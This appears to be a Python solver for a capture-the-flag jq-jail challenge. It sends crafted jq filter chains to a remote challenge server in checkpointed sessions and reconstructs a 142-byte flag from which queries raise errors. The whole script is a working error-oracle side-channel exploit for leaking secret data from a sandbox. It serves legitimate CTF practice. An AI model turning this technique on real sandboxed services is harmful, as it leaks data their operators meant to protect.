#!/usr/bin/env python3
"""Checkpointed calibrated solver for the real 142-byte remote flag.

Only lowercase jq filter names and pipes are emitted.  The script recalibrates
all 225 predicate chains against jq 1.8.2, keeps actual singleton chains, drops
three empirically invalid feature models, and queries in independent sessions
so the pwn.red 240-second per-connection limit cannot discard all progress.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import sys
import time
from pathlib import Path

import solve_checked as base
from solve_set_oracle_v2 import accept_sets_by_jq, build_value_universe, unique_chains

LENGTH = 142
BAD_BASE_INDICES = {18, 19}
BAD_EXTRA_NAMES = {"implj7_add"}


def build_extra_features() -> list[base.Feature]:
    out: list[base.Feature] = []
    kinds = ("len", "first", "last", "min", "max", "add")
    for typ in ("impl", "flat", "rec"):
        for nesting in range(6, 9):
            if typ == "impl":
                prefix = ["flatten", "implode"]
            elif typ == "flat":
                prefix = ["flatten"]
            else:
                prefix = []
            checksum_parts = prefix + ["tojson"] * nesting + ["explode", "add"]

            def checksum(
                index: int,
                char: int | None,
                typ: str = typ,
                nesting: int = nesting,
            ) -> int:
                flat = [index] if char is None else [index, char]
                if typ == "impl":
                    value: object = "".join(chr(item) for item in flat)
                elif typ == "flat":
                    value = flat
                else:
                    value = [[index]] if char is None else [[index], char]
                return base.codepoint_sum(base.nested_json(value, nesting))

            for kind in kinds:
                name = f"{typ}j{nesting}_{kind}"
                if name in BAD_EXTRA_NAMES:
                    continue
                parts = list(checksum_parts)
                if kind == "len":
                    parts += ["tostring", "length"]
                else:
                    parts += ["tostring", "explode", kind]

                def evaluate(
                    index: int,
                    char: int | None,
                    checksum=checksum,
                    kind: str = kind,
                ) -> int:
                    return base.decimal_fingerprint(checksum(index, char), kind)

                out.append(base.Feature(name, "|".join(parts), evaluate))
    return out


def calibrated_plan(
    chains_path: Path,
    charset: str,
    jq_cmd: str,
):
    original_features = base.FEATURES
    features = [
        feature
        for index, feature in enumerate(original_features)
        if index not in BAD_BASE_INDICES
    ] + build_extra_features()
    base.FEATURES = features

    chain_ops = unique_chains(chains_path)
    universe = build_value_universe(base, LENGTH, charset, len(features))
    accepts = accept_sets_by_jq(jq_cmd, chain_ops, universe)
    singleton_chains: dict[int, list[str]] = {}
    for ops, accept in zip(chain_ops, accepts):
        if len(accept) != 1:
            continue
        value = next(iter(accept))
        old = singleton_chains.get(value)
        if old is None or len(ops) < len(old):
            singleton_chains[value] = ops

    expressions, metadata = base.make_feature_queries(
        LENGTH,
        charset,
        range(len(features)),
        singleton_chains,
    )
    fingerprint = hashlib.sha256(
        ("\n".join(expressions) + "\n" + charset).encode()
    ).hexdigest()
    return original_features, features, singleton_chains, expressions, metadata, fingerprint


def load_checkpoint(path: Path, fingerprint: str, count: int) -> dict:
    if not path.exists():
        return {
            "fingerprint": fingerprint,
            "query_count": count,
            "answers": {},
        }
    data = json.loads(path.read_text())
    if data.get("fingerprint") != fingerprint or data.get("query_count") != count:
        raise RuntimeError(
            f"checkpoint {path} belongs to a different query plan; remove or rename it"
        )
    answers = data.get("answers")
    if not isinstance(answers, dict):
        raise RuntimeError("invalid checkpoint answers")
    return data


def save_checkpoint(path: Path, data: dict) -> None:
    temporary = path.with_suffix(path.suffix + ".tmp")
    temporary.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")
    temporary.replace(path)


def collect_remote(
    host: str,
    port: int,
    timeout: int,
    expressions: list[str],
    checkpoint: dict,
    checkpoint_path: Path,
    session_queries: int,
    max_sessions: int,
) -> None:
    answers: dict[str, str] = checkpoint["answers"]
    missing = [index for index in range(len(expressions)) if str(index) not in answers]
    if not missing:
        print("[+] all remote observations already present", flush=True)
        return

    sessions = 0
    while missing and sessions < max_sessions:
        sessions += 1
        indices = missing[:session_queries]
        group = [expressions[index] for index in indices]
        print(
            f"[*] remote session {sessions}: queries {indices[0]}..{indices[-1]} "
            f"({len(group)}); remaining before session={len(missing)}",
            flush=True,
        )
        oracle = base.RemoteOracle(host, port, timeout)
        try:
            started = time.time()
            group_answers = oracle.query_batch(group)
            if len(group_answers) != len(group):
                raise RuntimeError(
                    f"short answer batch: {len(group_answers)}/{len(group)}"
                )
            for index, answer in zip(indices, group_answers):
                answers[str(index)] = answer
            save_checkpoint(checkpoint_path, checkpoint)
            print(
                f"[+] checkpointed {len(answers)}/{len(expressions)} answers "
                f"after {time.time() - started:.1f}s",
                flush=True,
            )
        finally:
            oracle.close()
        missing = [
            index for index in range(len(expressions)) if str(index) not in answers
        ]


def analyze(
    charset: str,
    features: list[base.Feature],
    metadata,
    checkpoint: dict,
    solution_limit: int,
    output_path: Path,
) -> int:
    answers: dict[str, str] = checkpoint["answers"]
    missing = [index for index in range(len(metadata)) if str(index) not in answers]
    if missing:
        print(
            f"[!] {len(missing)} observations still missing; next index={missing[0]}",
            flush=True,
        )
        return 2

    observations: list[base.Observation] = []
    for index, (feature_index, reverse, value, nuisance) in enumerate(metadata):
        observations.append(
            base.Observation(
                feature_index,
                reverse,
                value,
                nuisance,
                answers[str(index)] == "error",
            )
        )

    domains = base.apply_negative_observations(LENGTH, charset, observations)
    constraints = base.positive_constraints(LENGTH, observations, domains)
    partial = "".join(
        chr(chars[0]) if len(chars) == 1 else "?"
        for chars in domains.values()
    )
    ambiguous = {
        position: "".join(map(chr, chars))
        for position, chars in domains.items()
        if len(chars) > 1
    }
    print(f"[+] partial flag: {partial}", flush=True)
    print(
        f"[+] domain size={sum(map(len, domains.values()))}; "
        f"ambiguous positions={len(ambiguous)}; "
        f"positive constraints={len(constraints)}",
        flush=True,
    )
    for position, chars in ambiguous.items():
        print(f"    pos {position:3d}: {chars}", flush=True)

    solutions = base.solve_constraints(
        LENGTH, domains, constraints, limit=solution_limit
    )
    print(f"[+] enumerated solutions: {len(solutions)}", flush=True)
    for solution in solutions[:20]:
        print(f"    {solution}", flush=True)

    report = {
        "length": LENGTH,
        "charset": charset,
        "feature_count": len(features),
        "partial": partial,
        "domains": {str(k): v for k, v in ambiguous.items()},
        "domain_size": sum(map(len, domains.values())),
        "positive_constraints": len(constraints),
        "solutions": solutions,
    }
    output_path.write_text(json.dumps(report, indent=2) + "\n")
    print(f"[+] wrote analysis: {output_path}", flush=True)
    if len(solutions) == 1:
        print(f"[***] UNIQUE FLAG: {solutions[0]} [***]", flush=True)
        return 0
    return 3


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--chains", type=Path, default=Path("chains_225.json"))
    parser.add_argument("--checkpoint", type=Path, default=Path("remote_142_checkpoint.json"))
    parser.add_argument("--analysis", type=Path, default=Path("remote_142_analysis.json"))
    parser.add_argument("--charset", default=base.DEFAULT_CHARSET)
    parser.add_argument("--jq", default="jq")
    parser.add_argument("--session-queries", type=int, default=800)
    parser.add_argument("--max-sessions", type=int, default=1)
    parser.add_argument("--timeout", type=int, default=180)
    parser.add_argument("--solution-limit", type=int, default=200)
    parser.add_argument("host", nargs="?", default="challs.pyjail.club")
    parser.add_argument("port", nargs="?", type=int, default=20219)
    args = parser.parse_args()

    (
        original_features,
        features,
        singleton_chains,
        expressions,
        metadata,
        fingerprint,
    ) = calibrated_plan(args.chains, args.charset, args.jq)
    try:
        print(
            f"[+] fixed remote length={LENGTH}; features={len(features)}; "
            f"calibrated singleton values={len(singleton_chains)}; "
            f"queries={len(expressions)}",
            flush=True,
        )
        checkpoint = load_checkpoint(
            args.checkpoint, fingerprint, len(expressions)
        )
        print(
            f"[+] checkpoint contains {len(checkpoint['answers'])}/"
            f"{len(expressions)} answers",
            flush=True,
        )
        collect_remote(
            args.host,
            args.port,
            args.timeout,
            expressions,
            checkpoint,
            args.checkpoint,
            args.session_queries,
            args.max_sessions,
        )
        return analyze(
            args.charset,
            features,
            metadata,
            checkpoint,
            args.solution_limit,
            args.analysis,
        )
    finally:
        base.FEATURES = original_features


if __name__ == "__main__":
    raise SystemExit(main())
